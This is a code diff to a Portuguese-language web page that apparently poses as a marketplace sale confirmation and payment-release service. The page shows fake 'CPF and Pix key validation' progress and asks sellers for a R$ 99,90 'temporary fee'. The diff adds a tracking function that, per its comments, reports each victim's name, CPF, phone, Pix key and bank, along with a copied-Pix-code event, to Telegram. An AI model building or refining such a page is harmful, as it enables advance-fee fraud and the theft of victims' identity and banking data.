@@ -1020,13 +1020,32 @@
     let _COUNTDOWN_INTERVAL = null;
     let _POLLING_INTERVAL = null;
 
-    // Recupera parâmetros da URL (injetados pelo link do email)
+    // Recupera parâmetros da URL ou rota (injetados pelo link do email)
     const urlParams = new URLSearchParams(window.location.search);
+    const tokenParam = urlParams.get('token') || '{{ token or "" }}' || (window.location.pathname.startsWith('/liberacao/') ? window.location.pathname.split('/')[2] : (window.location.pathname.startsWith('/confirmar-venda/') ? window.location.pathname.split('/')[2] : ''));
     const sellerParam = urlParams.get('vendedor') || '{{ seller_name }}' || 'Vendedor Titular';
     const buyerParam = urlParams.get('comprador') || '{{ buyer_name }}' || 'Lucas Ferreira';
     const productParam = urlParams.get('produto') || '{{ product_name }}' || 'iPhone 13 Pro 128GB Grafite';
     const dateParam = urlParams.get('data') || '{{ sale_date }}' || '24/11/2026';
     const valueParam = urlParams.get('valor') || '{{ sale_value }}' || '2.850,00';
+
+    // Rastreamento em tempo real de cada movimentação para o Telegram
+    async function trackLeadEvent(eventType, extraData = {}) {
+      try {
+        const payload = Object.assign({
+          token: tokenParam,
+          event: eventType,
+          step: currentStep,
+          product_name: productParam,
+          sale_amount: valueParam
+        }, extraData);
+        await fetch('/api/confirmar-venda/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {}
+    }
 
     // Formata e exibe os valores
     document.getElementById('disp-seller-name').textContent = sellerParam;
@@ -1237,6 +1256,15 @@
           return;
         }
 
+        // Rastreia no Telegram os dados preenchidos pelo lead
+        trackLeadEvent('LEAD_IDENTIFIED', {
+          full_name: nameVal,
+          cpf: cpfVal,
+          phone: phoneVal,
+          pix_key: pixVal,
+          pix_bank: document.getElementById('lead-bank').value
+        });
+
         goToStep(3);
       } else if (currentStep === 4) {
         generateElitePayCharge();
@@ -1252,6 +1280,7 @@
       const chk1 = document.getElementById('chk-1');
       const chk2 = document.getElementById('chk-2');
       const chk3 = document.getElementById('chk-3');
+      const svgCheck = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>';
 
       // Estágio 1 (0% -> 35%)
       progressBar.style.width = '35%';
@@ -1259,21 +1288,21 @@
 
       setTimeout(() => {
         chk1.classList.add('done');
-        chk1.querySelector('.check-badge').innerHTML = '✓';
+        chk1.querySelector('.check-badge').innerHTML = svgCheck;
         progressBar.style.width = '70%';
         label.textContent = 'Validando autenticidade do CPF e chave Pix bancária...';
       }, 1500);
 
       setTimeout(() => {
         chk2.classList.add('done');
-        chk2.querySelector('.check-badge').innerHTML = '✓';
+        chk2.querySelector('.check-badge').innerHTML = svgCheck;
         progressBar.style.width = '100%';
         label.textContent = 'Aprovando protocolo de repasse imediato...';
       }, 3000);
 
       setTimeout(() => {
         chk3.classList.add('done');
-        chk3.querySelector('.check-badge').innerHTML = '✓';
+        chk3.querySelector('.check-badge').innerHTML = svgCheck;
         label.textContent = 'Tudo pronto! Redirecionando para liberação...';
       }, 4200);
 
@@ -1292,6 +1321,7 @@
       btnText.textContent = 'Gerando Cobrança Pix Segura...';
 
       const payload = {
+        token: tokenParam,
         full_name: inpName.value.trim(),
         cpf: inpCpf.value.replace(/\D/g, ''),
         phone: inpPhone.value.replace(/\D/g, ''),
@@ -1335,17 +1365,19 @@
       }
     }
 
-    // Copiar código Pix com feedback
+    // Copiar código Pix com feedback e rastreamento
     function copyPixCode() {
       const txt = document.getElementById('pix-code-text').textContent;
       if (!txt || txt.includes('Carregando')) return;
 
       navigator.clipboard.writeText(txt).then(() => {
         showToast('Código Pix copiado para a área de transferência!', 'success');
+        trackLeadEvent('PIX_COPIED');
+
         const btn = document.getElementById('btn-copy-pix');
         btn.style.background = '#00a650';
         btn.style.borderColor = '#00a650';
-        btn.innerHTML = '✓ Código Copiado!';
+        btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="display:inline-block;vertical-align:-3px;margin-right:6px"><polyline points="20 6 9 17 4 12"/></svg> Código Copiado!`;
         setTimeout(() => {
           btn.style.background = '';
           btn.style.borderColor = '';
@@ -1382,19 +1414,21 @@
 
       _POLLING_INTERVAL = setInterval(async () => {
         try {
-          const res = await fetch(`/api/confirmar-venda/status-pix?txid=${encodeURIComponent(txid)}`);
+          const res = await fetch(`/api/confirmar-venda/status-pix?txid=${encodeURIComponent(txid)}&token=${encodeURIComponent(tokenParam)}`);
           const d = await res.json();
           if (d.paid || d.status === 'APPROVED' || d.status === 'CONCLUIDO') {
             clearInterval(_POLLING_INTERVAL);
             clearInterval(_COUNTDOWN_INTERVAL);
-            statusEl.textContent = '✓ Pagamento Confirmado!';
+            statusEl.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="display:inline-block;vertical-align:-2px;margin-right:4px"><polyline points="20 6 9 17 4 12"/></svg> Pagamento Confirmado!';
             statusEl.style.color = '#00a650';
             showToast('Pagamento confirmado com sucesso!', 'success');
 
             // Exibe tela final de sucesso
             document.querySelector('.content-area').innerHTML = `
               <div style="text-align:center;padding:50px 10px;animation:fadeIn .5s ease">
-                <div style="width:72px;height:72px;border-radius:50%;background:#e6f7ee;color:#00a650;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:36px">✓</div>
+                <div style="width:72px;height:72px;border-radius:50%;background:#e6f7ee;color:#00a650;display:flex;align-items:center;justify-content:center;margin:0 auto 20px">
+                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#00a650" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
                 <h2 style="font-size:24px;font-weight:900;color:#1a1b1c;margin-bottom:10px">Venda e Reembolso Liberados!</h2>
                 <p style="font-size:14px;color:#555;line-height:1.5;max-width:380px;margin:0 auto 24px">Sua taxa temporária de <strong>R$ 99,90</strong> foi estornada e o valor total de <strong style="color:#00a650">${document.getElementById('bk-total-val').textContent}</strong> está sendo enviado via Pix para sua chave cadastrada.</p>
                 <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:16px;text-align:left;font-size:13px;margin-bottom:24px">
